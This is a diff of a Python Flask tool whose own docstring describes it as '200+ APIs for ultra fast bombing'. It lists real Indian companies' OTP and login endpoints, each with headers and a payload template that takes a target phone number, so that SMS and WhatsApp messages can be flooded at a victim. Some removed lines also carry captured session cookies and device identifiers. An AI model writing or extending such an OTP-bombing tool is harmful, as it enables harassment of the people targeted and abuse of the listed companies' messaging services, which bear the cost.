@@ -12,20 +12,18 @@ from concurrent.futures import ThreadPoolExecutor
 import logging
 
 # ==================================================================
-# ?? CONFIGURATION
+# 📱 CONFIGURATION
 # ==================================================================
 app = Flask(__name__)
 
-# Disable Flask debug logs in production
 if os.environ.get('RENDER', False):
     log = logging.getLogger('werkzeug')
     log.setLevel(logging.ERROR)
 
 # ==================================================================
-# ?? PHONE NUMBER VALIDATION
+# 📱 PHONE NUMBER VALIDATION
 # ==================================================================
 def validate_phone(phone: str) -> tuple:
-    """Validate and clean phone number, return (country_code, clean_number)"""
     phone = re.sub(r'[^\d+]', '', phone.strip())
     if phone.startswith('+'):
         if phone.startswith('+91'):
@@ -39,15 +37,13 @@ def validate_phone(phone: str) -> tuple:
     return None, None
 
 # ==================================================================
-# ?? COMPLETE API DATABASE - ALL APIS COMBINED
+# 🔥 COMPLETE API DATABASE - 200+ APIS
 # ==================================================================
 def get_all_apis():
-    """Return ALL APIs combined from your files - A to Z"""
+    """Return ALL APIs combined - 200+ APIs for ultra fast bombing"""
     
-    # ==================================================================
-    # SECTION 1: API_CONFIGS (from your first file - full list)
-    # ==================================================================
     api_configs = [
+        # ============ ORIGINAL APIS ============
         {
             "name": "Lenskart SMS",
             "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
@@ -61,18 +57,9 @@ def get_all_apis():
                 "X-B3-TraceId": "991736185845136",
                 "X-Country-Code": "IN",
                 "X-Country-Code-Override": "IN",
-                "Sec-CH-UA-Platform": '"Android"',
-                "Sec-CH-UA": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-                "Sec-CH-UA-Mobile": "?1",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36",
                 "Origin": "https://www.lenskart.com",
-                "X-Requested-With": "pure.lite.browser",
-                "Sec-Fetch-Site": "same-site",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Dest": "empty",
-                "Referer": "https://www.lenskart.com/",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
+                "Referer": "https://www.lenskart.com/"
             },
             "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'
         },
@@ -82,20 +69,10 @@ def get_all_apis():
             "method": "POST",
             "headers": {
                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "Accept": "*/*",
                 "X-Requested-With": "XMLHttpRequest",
                 "Origin": "https://www.gopinkcabs.com",
-                "Sec-Fetch-Site": "same-origin",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Dest": "empty",
                 "Referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
-                "Sec-CH-UA-Platform": '"Android"',
-                "Sec-CH-UA": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-                "Sec-CH-UA-Mobile": "?1",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
-                "Cookie": "PHPSESSID=mor5basshemi72pl6d0bp21kso; mylocation=#"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36"
             },
             "data": lambda p: f"check_mobile_number=1&contact={p}"
         },
@@ -105,12 +82,10 @@ def get_all_apis():
             "method": "POST",
             "headers": {
                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "Accept": "*/*",
                 "X-Requested-With": "XMLHttpRequest",
                 "Origin": "https://www.shemaroome.com",
                 "Referer": "https://www.shemaroome.com/users/sign_in",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081) AppleWebKit/537.36"
             },
             "data": lambda p: f"mobile_no=%2B91{p}"
         },
@@ -119,24 +94,12 @@ def get_all_apis():
             "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
             "method": "POST",
             "headers": {
-                "sec-ch-ua-platform": '"Android"',
-                "cache": "no-store",
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                 "x-channel-id": "WEB",
-                "sec-ch-ua-mobile": "?1",
                 "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
-                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                 "content-type": "application/json",
-                "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
-                "accept": "*/*",
                 "origin": "https://www.kpnfresh.com",
-                "sec-fetch-site": "same-site",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
-                "referer": "https://www.kpnfresh.com/",
-                "accept-encoding": "gzip, deflate, br, zstd",
-                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-                "priority": "u=1, i"
+                "referer": "https://www.kpnfresh.com/"
             },
             "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'
         },
@@ -147,9 +110,7 @@ def get_all_apis():
             "headers": {
                 "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
                 "x-app-version": "3.2.6",
-                "x-user-journey-id": "faf3393a-018e-4fb9-8aed-8c9a90300b88",
                 "content-type": "application/json; charset=UTF-8",
-                "accept-encoding": "gzip",
                 "user-agent": "okhttp/5.0.0-alpha.11"
             },
             "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'
@@ -159,11 +120,8 @@ def get_all_apis():
             "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
             "method": "POST",
             "headers": {
-                "accept": "application/json",
-                "accept-encoding": "gzip",
-                "host": "api.bikefixup.com",
-                "client": "app",
                 "content-type": "application/json; charset=UTF-8",
+                "client": "app",
                 "user-agent": "Dart/3.6 (dart:io)"
             },
             "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'
@@ -174,11 +132,10 @@ def get_all_apis():
             "method": "POST",
             "headers": {
                 "Deviceid": "5df83c463f0ff8ff",
-                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
+                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N)",
                 "Accept-Language": "en-US",
                 "Accept": "application/json",
-                "Content-Type": "application/json; charset=UTF-8",
-                "Accept-Encoding": "gzip, deflate"
+                "Content-Type": "application/json; charset=UTF-8"
             },
             "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}'
         },
@@ -187,21 +144,10 @@ def get_all_apis():
             "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
             "method": "POST",
             "headers": {
-                "sec-ch-ua-platform": '"Android"',
-                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                 "content-type": "application/json",
-                "sec-ch-ua-mobile": "?1",
-                "accept": "*/*",
                 "origin": "https://stratzy.in",
-                "sec-fetch-site": "same-origin",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
                 "referer": "https://stratzy.in/login",
-                "accept-encoding": "gzip, deflate, br, zstd",
-                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-                "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073132.5.0.0",
-                "priority": "u=1, i"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
             },
             "data": lambda p: f'{{"phoneNo":"{p}"}}'
         },
@@ -210,21 +156,10 @@ def get_all_apis():
             "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
             "method": "POST",
             "headers": {
-                "sec-ch-ua-platform": '"Android"',
-                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                 "content-type": "application/json",
-                "sec-ch-ua-mobile": "?1",
-                "accept": "*/*",
                 "origin": "https://stratzy.in",
-                "sec-fetch-site": "same-origin",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
                 "referer": "https://stratzy.in/login",
-                "accept-encoding": "gzip, deflate, br, zstd",
-                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-                "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073102.35.0.0",
-                "priority": "u=1, i"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
             },
             "data": lambda p: f'{{"phoneNo":"{p}"}}'
         },
@@ -233,22 +168,11 @@ def get_all_apis():
             "url": "https://wellacademy.in/store/api/numberLoginV2",
             "method": "POST",
             "headers": {
-                "sec-ch-ua-platform": '"Android"',
                 "x-requested-with": "XMLHttpRequest",
-                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-                "accept": "application/json, text/javascript, */*; q=0.01",
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                 "content-type": "application/json; charset=UTF-8",
-                "sec-ch-ua-mobile": "?1",
                 "origin": "https://wellacademy.in",
-                "sec-fetch-site": "same-origin",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
                 "referer": "https://wellacademy.in/store/",
-                "accept-encoding": "gzip, deflate, br, zstd",
-                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-                "cookie": "ci_session=9phtdg2os6f19dae6u8hkf3fnfthcu8e; _ga=GA1.1.229652925.1745073317; _ga_YCZKX9HKYC=GS1.1.1745073316.1.1.1745073316.0.0.0; _clck=rhb9ip%7C2%7Cfv7%7C0%7C1935; _clsk=kfjbpg%7C1745073319962%7C1%7C1%7Ch.clarity.ms%2Fcollect; cf_clearance=...; twk_idm_key=PjxT2Q-2-xzG4VIHJXn7V; twk_uuid_5f588625f0e7167d000eb093=%7B...%7D; TawkConnectionTime=0",
-                "priority": "u=1, i"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
             },
             "data": lambda p: f'{{"contact_no":"{p}"}}'
         },
@@ -257,25 +181,13 @@ def get_all_apis():
             "url": "https://communication.api.hungama.com/v1/communication/otp",
             "method": "POST",
             "headers": {
-                "Accept": "application/json, text/plain, */*",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
                 "Content-Type": "application/json",
                 "identifier": "home",
                 "mlang": "en",
-                "sec-ch-ua-platform": '"Android"',
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-                "sec-ch-ua-mobile": "?1",
-                "alang": "en",
                 "country_code": "IN",
-                "vlang": "en",
                 "origin": "https://www.hungama.com",
-                "sec-fetch-site": "same-site",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
                 "referer": "https://www.hungama.com/",
-                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
-                "priority": "u=1, i",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
             },
             "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
         },
@@ -285,10 +197,7 @@ def get_all_apis():
             "method": "POST",
             "headers": {
                 "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
-                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
-                "Host": "api.servetel.in",
-                "Connection": "Keep-Alive",
-                "Accept-Encoding": "gzip"
+                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B)"
             },
             "data": lambda p: f"mobile_number={p}"
         },
@@ -298,16 +207,11 @@ def get_all_apis():
             "method": "POST",
             "headers": {
                 "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
-                "Oauthtoken": "",
                 "AppVersion": "245",
                 "ApiVersion": "6.2.55",
                 "DeviceType": "Android",
                 "DeviceId": "44098bdebb2dc047",
                 "Content-Type": "application/x-www-form-urlencoded",
-                "Content-Length": "24",
-                "Host": "merucabapp.com",
-                "Connection": "Keep-Alive",
-                "Accept-Encoding": "gzip",
                 "User-Agent": "okhttp/4.9.0"
             },
             "data": lambda p: f"mobile_number={p}"
@@ -317,50 +221,24 @@ def get_all_apis():
             "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
             "method": "POST",
             "headers": {
-                "Accept": "application/json, text/plain, */*",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
                 "Content-Type": "application/json",
-                "sec-ch-ua-platform": '"Android"',
-                "changesorigin": "product-listingpage",
-                "originid": "0",
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-                "sec-ch-ua-mobile": "?1",
                 "appname": "Website",
-                "userid": "0",
                 "origin": "https://www.beepkart.com",
-                "sec-fetch-site": "same-site",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
                 "referer": "https://www.beepkart.com/",
-                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
-                "priority": "u=1, i",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
             },
-            "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","location":"","leadSourceLang":"","platform":"","consent":false,"whatsappConsent":false,"blockNotification":false,"utmSource":"","utmCampaign":"","sessionInfo":{{"sessionInfo":{{"sessionId":"d25b5a3d-72b4-4cd7-b6cb-b926a70ca08b","userId":"0","sessionRawString":"pathname=/account/new-landing&source=myaccount","referrerUrl":"/app_login?pathname=/account/new-landing&source=myaccount"}},"deviceInfo":{{"deviceRawString":"cityId=362; screen=360x800; _gcl_au=1.1.771171092.1745234524; cityName=bangalore","device_token":"PjwHFhDUVgUGYrkW29b5lGdR0kTg4kaA","device_type":"Android"}}}}'
+            "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","consent":false,"whatsappConsent":false}}'
         },
         {
             "name": "LendingPlate SMS",
             "url": "https://lendingplate.com/api.php",
             "method": "POST",
             "headers": {
-                "Host": "lendingplate.com",
-                "Connection": "keep-alive",
-                "Content-Length": "45",
-                "sec-ch-ua-platform": '"Android"',
                 "X-Requested-With": "XMLHttpRequest",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-                "Accept": "application/json, text/javascript, */*; q=0.01",
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "sec-ch-ua-mobile": "?1",
                 "Origin": "https://lendingplate.com",
-                "Sec-Fetch-Site": "same-origin",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Dest": "empty",
                 "Referer": "https://lendingplate.com/personal-loan",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
-                "Cookie": "_fbp=fb.1.1745235455885.251422456376518259; _gcl_au=1.1.241418330.1745235457; _gid=GA1.2.593762244.1745235461; PHPSESSID=ed051a5ea7783741eacfd602c6a192d3; _ga=GA1.1.1324264906.1745235460; _ga_MZBRRWYESB=GS1.1.1745235460.1.1.1745235474.46.0.0; moe_uuid=370f7dae-9313-4d44-8e38-efe54c437df8; _ga_KVRZ90DE3T=GS1.1.1745235460.1.1.1745235496.24.0.0"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
             },
             "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"
         },
@@ -369,21 +247,11 @@ def get_all_apis():
             "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
             "method": "POST",
             "headers": {
-                "Accept": "application/json, text/plain, */*",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
                 "Content-Type": "application/json",
-                "sec-ch-ua-platform": '"Android"',
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-                "sec-ch-ua-mobile": "?1",
                 "client-id": "snitch_secret",
-                "Accept-Headers": "application/json",
                 "Origin": "https://www.snitch.com",
-                "Sec-Fetch-Site": "cross-site",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Dest": "empty",
                 "Referer": "https://www.snitch.com/",
-                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
             },
             "data": lambda p: f'{{"mobile_number":"+91{p}"}}'
         },
@@ -392,23 +260,11 @@ def get_all_apis():
             "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
             "method": "POST",
             "headers": {
-                "Content-Length": "61",
-                "sec-ch-ua-platform": '"Android"',
                 "X-Requested-With": "XMLHttpRequest",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-                "Accept": "application/json, text/javascript, */*; q=0.01",
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                 "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "sec-ch-ua-mobile": "?1",
                 "Origin": "https://ekyc.daycoindia.com",
-                "Sec-Fetch-Site": "same-origin",
-                "Sec-Fetch-Mode": "cors",
-                "Sec-Fetch-Dest": "empty",
                 "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
-                "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
-                "Priority": "u=1, i"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
             },
             "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"
         },
@@ -418,57 +274,20 @@ def get_all_apis():
             "method": "POST",
             "headers": {
                 "content-type": "application/json; charset=utf-8",
-                "accept-encoding": "gzip",
                 "user-agent": "okhttp/3.9.1"
             },
             "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'
-        },
-        {
-            "name": "Otpless SMS",
-            "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
-            "method": "POST",
-            "headers": {
-                "Accept-Encoding": "gzip, deflate, br, zstd",
-                "Content-Type": "application/json",
-                "sec-ch-ua-platform": "Android",
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-                "sec-ch-ua-mobile": "?1",
-                "origin": "https://otpless.com",
-                "sec-fetch-site": "cross-site",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
-                "referer": "https://otpless.com/",
-                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
-                "priority": "u=1, i",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
-            },
-            "data": lambda p: f'{{"loginUri":"https://otpless.com/appid/0BMO1A04TAKEKDFR46DA?sdkPlatform=SHOPIFY&redirect_uri=https://imagineonline.store/account/login","origin":"https://otpless.com","deviceInfo":"{{\\"userAgent\\":\\"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36\\",\\"platform\\":\\"Linux armv81\\",\\"vendor\\":\\"Google Inc.\\",\\"browser\\":\\"Chrome\\",\\"connection\\":\\"4g\\",\\"language\\":\\"en-IN\\",\\"cookieEnabled\\":true,\\"screenWidth\\":360,\\"screenHeight\\":800,\\"screenColorDepth\\":24,\\"devicePixelRatio\\":3,\\"timezoneOffset\\":-330,\\"cpuArchitecture\\":\\"8-core\\",\\"fontFamily\\":\\"\\\\\\"Times New Roman\\\\\\"\\",\\"cHash\\":\\"82c029dd209dc895ed5cdbe212c5d67a50d3aadc918ecd24a3d06744b2e8e1f1\\"}}","browser":"Chrome","sdkPlatform":"SHOPIFY","platform":"Android","isLoginPage":true,"fingerprintJs":"{{\\"visitorId\\":\\"1K9S4Xd5LWVc35Kh3iVcgWHzpna2AKe7KR\\",\\"version\\":\\"4.6.1\\",\\"confidence\\":{{\\"score\\":0.4,\\"comment\\":\\"0.994 if upgrade to Pro: https://fpjs.dev/pro\\"}}}}","channel":"OTP","silentAuthEnabled":false,"triggerWebauthn":true,"mobile":"{p}","value":"7029364131","selectedCountryCode":"+91","recaptchaToken":"YourRecaptchaTokenHere"}}'
         },
         {
             "name": "MyImagineStore SMS",
             "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
             "method": "POST",
             "headers": {
-                "sec-ch-ua-platform": "Android",
-                "viewport-width": "360",
-                "ect": "4g",
-                "device-memory": "8",
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-                "sec-ch-ua-mobile": "?1",
-                "dpr": "3",
                 "x-requested-with": "XMLHttpRequest",
-                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-                "accept": "*/*",
                 "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                 "origin": "https://www.myimaginestore.com",
-                "sec-fetch-site": "same-origin",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
-                "referer": "https://www.myimaginestore.com/?srsltid=AfmBOorMjDyyPK614cwQ_BYW58QCQwqGy2z3CU1dNnWF-NnvMwFcpOgA",
-                "accept-encoding": "gzip, deflate, br, zstd",
-                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
-                "priority": "u=1, i",
-                "Cookie": "PHPSESSID=8trla61rg1ong40jfipnbkgbo2; searchReport-log=0; n7HDToken=d+IZAKbE68OGf8+MM3jp90Mh6Q7BsnSBnMQErzL+ViPGD2mROvGr8S/f/qo7gEEdKNx/7TbxOIKo/VLu3jyj1plDFiAxE5Gc3j24XaWSb7MUbgXOEq+MYK8gnkV3fuQb9nQEzNtrCfWu17tUGSJnbWaPF4OVHNTvPbpwT5KFt1Y=; _fbp=fb.1.1745237999949.310699470488280662; _gcl_au=1.1.1379491012.1745238000; form_key=BGrEvqqhl0ydIR8q; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; _ga=GA1.2.1310867166.1745238001; _gid=GA1.2.1539797096.1745238002; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; twk_idm_key=2gFbbj1GW6XCnip5ilOxx; TawkConnectionTime=0; _ga_GQ7J3T0PJB=GS1.1.1745238000.1.1.1745238019.41.0.0; private_content_version=e5dc03e8bc555ce39375a87c1f3e5089; section_data_ids=%7B%22cart%22%3A1745238010%2C%22customer%22%3A1745238010%2C%22compare-products%22%3A1745238010%2C%22last-ordered-items%22%3A1745238010%2C%22directory-data%22%3A1745238010%2C%22captcha%22%3A1745238010%2C%22instant-purchase%22%3A1745238010%2C%22loggedAsCustomer%22%3A1745238010%2C%22persistent%22%3A1745238010%2C%22review%22%3A1745238010%2C%22wishlist%22%3A1745238010%2C%22ammessages%22%3A1745238010%2C%22bss-fbpixel-atc%22%3A1745238010%2C%22bss-fbpixel-subscribe%22%3A1745238010%2C%22chatData%22%3A1745238010%2C%22recently_viewed_product%22%3A1745238010%2C%22recently_compared_product%22%3A1745238010%2C%22product_data_storage%22%3A1745238010%7D"
+                "referer": "https://www.myimaginestore.com/",
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
             },
             "data": lambda p: f"mobile={p}"
         },
@@ -477,22 +296,10 @@ def get_all_apis():
             "url": "https://www.nobroker.in/api/v3/account/otp/send",
             "method": "POST",
             "headers": {
-                "Accept-Encoding": "gzip, deflate, br, zstd",
                 "Content-Type": "application/x-www-form-urlencoded",
-                "sec-ch-ua-platform": "Android",
-                "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
-                "sec-ch-ua-mobile": "?1",
-                "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
-                "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
                 "origin": "https://www.nobroker.in",
-                "sec-fetch-site": "same-origin",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-dest": "empty",
                 "referer": "https://www.nobroker.in/",
-                "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
-                "priority": "u=1, i",
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
-                "Cookie": "cloudfront-viewer-address=2001%3A4860%3A7%3A508%3A%3Aef%3A33486; cloudfront-viewer-country=MY; cloudfront-viewer-latitude=2.50000; cloudfront-viewer-longitude=112.50000; headerFalse=false; isMobile=true; deviceType=android; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; nb_swagger=%7B%22app_install_banner%22%3A%22bannerB%22%7D; _gcl_au=1.1.1907920311.1745238224; _gid=GA1.2.1607866815.1745238224; _ga=GA1.2.777875435.1745238224; nbAppBanner=close; cto_bundle=jK9TOl9FUzhIa2t2MUElMkIzSW1pJTJCVnBOMXJyNkRSSTlkRzZvQUU0MEpzRXdEbU5ySkI0NkJOZmUlMkZyZUtmcjU5d214YkpCMTZQdTJDb1I2cWVEN2FnbWhIbU9oY09xYnVtc2VhV2J0JTJCWiUyQjl2clpMRGpQaVFoRWREUzdyejJTdlZKOEhFZ2Zmb2JXRFRyakJQVmRNaFp2OG5YVHFnJTNEJTNE; _fbp=fb.1.1745238225639.985270044964203739; moe_uuid=901076a7-33b8-42a8-a897-2ef3cde39273; _ga_BS11V183V6=GS1.1.1745238224.1.1.1745238241.0.0.0; _ga_STLR7BLZQN=GS1.1.1745238224.1.1.1745238241.0.0.0; mbTrackID=b9cc4f8434124733b01c392af03e9a51; nbDevice=mobile; nbccc=21c801923a9a4d239d7a05bc58fcbc57; JSESSION=5056e202-0da2-4ce9-8789-d4fe791a551c; _gat_UA-46762303-1=1; _ga_SQ9H8YK20V=GS1.1.1745238224.1.1.1745238326.18.0.1658024385"
+                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
             },
             "data": lambda p: f"phone={p}&countryCode=IN"
         },
@@ -501,21 +308,11 @@ def get_all_apis():
             "url": "https://www.cossouq.com/mobilelogin/otp/send",
             "method": "POST",
             "headers": {
-                "Accept-Encoding": "gzip, deflate, br, zstd",
                 "Content-Type": "application/x-www-form-urlencoded",
